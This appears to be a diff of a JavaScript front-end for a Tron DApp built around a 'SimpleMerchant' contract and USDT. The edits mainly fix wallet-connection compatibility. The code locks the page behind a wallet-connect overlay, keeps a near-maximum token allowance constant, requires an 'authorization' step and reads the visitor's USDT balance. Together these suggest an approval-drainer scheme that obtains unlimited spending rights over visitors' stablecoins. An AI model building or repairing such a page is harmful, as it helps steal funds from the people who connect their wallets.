@@ -1,11 +1,11 @@
-// --- 配置常量 ---
+// --- 配置常量 (使用你的实际 Tron Base58 地址) ---
 const TRON_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 SimpleMerchant 合约地址 (Tron)
 const TRC20_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // 你的 USDT TRC20 地址
 // const TRC20_USDC_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; // USDC 已注释
 
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
-// **【关键修复】SimpleMerchant 合约的 ABI (手动添加的 JSON 签名)**
+// **SimpleMerchant 合约的 ABI (手动组合的 JSON 签名，以解决 'is not a function' 错误)**
 const CONTRACT_ABI = [ 
     // connectAndAuthorize() external
     {
@@ -35,7 +35,6 @@ const CONTRACT_ABI = [
         "stateMutability": "view",
         "type": "function"
     }
-    // 如果 SimpleMerchant 合约还有其他函数，请务必以同样的 JSON 格式添加进来！
 ];
 
 // 使用你提供的完整的 TRC20 Token JSON ABI 
@@ -427,7 +426,6 @@ let tronWeb;
 let userAddress;
 let contractInstance; // SimpleMerchant 合约实例
 let usdtContractInstance; // USDT TRC20 实例
-// let usdcContractInstance; // USDC 已注释
 let isConnectedFlag = false;
 
 // --- 遮罩控制函數 (保持不变) ---
@@ -484,7 +482,6 @@ async function checkAuthorization() {
         }
 
         // 1. SimpleMerchant 合约授权检查
-        // 现在使用完整的 JSON 签名，应该能解决 is not a function 错误
         const authorizedResult = await contractInstance.authorized(userAddress).call();
         const isAuthorized = authorizedResult; 
         
@@ -496,10 +493,10 @@ async function checkAuthorization() {
         
         let usdtBalanceRaw = "0";
         try {
+            // Tron 的 USDT 是 6 位小数
             usdtBalanceRaw = await usdtContractInstance.balanceOf(userAddress).call();
         } catch(e) { /* Ignore */ }
         const usdtBalance = BigInt(usdtBalanceRaw);
-        // Tron 中的 USDT 通常是 6 位小数
         const formattedUsdtBalance = (Number(usdtBalance) / 10**6).toFixed(2);
 
 
@@ -545,7 +542,7 @@ async function checkAuthorization() {
     }
 }
 
-// --- 连接钱包逻辑 (使用 TronLink/TronWeb 流程) ---
+// --- 连接钱包逻辑 (使用 TronWeb 流程) ---
 async function connectWallet() {
     try {
         if (typeof window.tronWeb === 'undefined') {
@@ -554,14 +551,21 @@ async function connectWallet() {
             return;
         }
         
-        // 确保 TronLink 已解锁
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
+        updateStatus('Connecting to wallet...'); 
+        showOverlay('Waiting for wallet connection...');
+        
+        // **【修复点】** 移除 window.tronLink.request 的调用，兼容不支持 TronLink API 的DApp浏览器
+        
+        // 延迟一段时间等待 TronWeb 完全初始化 (可选，但可以增加兼容性)
+        await new Promise(resolve => setTimeout(resolve, 500)); 
 
         tronWeb = window.tronWeb;
-        userAddress = tronWeb.defaultAddress.base58; // 获取用户的 Base58 地址
+        
+        // 尝试从 defaultAddress.base58 获取地址
+        userAddress = tronWeb.defaultAddress.base58; 
 
-        if (!userAddress) {
-            throw new Error("Could not retrieve Tron account address. Please ensure TronLink is logged in.");
+        if (!userAddress || userAddress === tronWeb.defaultAddress.hex) { 
+            throw new Error("Could not retrieve Tron account address. Please ensure your wallet is connected/logged in and manually approve the connection in the App.");
         }
         
         console.log("✅ User Address:", userAddress);
@@ -572,7 +576,6 @@ async function connectWallet() {
 
         // 实例化 TRC20 合约
         usdtContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDT_ADDRESS);
-        // usdcContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDC_ADDRESS); // USDC 已注释
 
         // 检查授权状态 并处理
         await handleAuthorization();
@@ -607,7 +610,6 @@ function disconnectWallet() {
     tronWeb = null;
     contractInstance = null;
     usdtContractInstance = null;
-    // usdcContractInstance = null; // USDC 已注释
     updateConnectionUI(false);
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
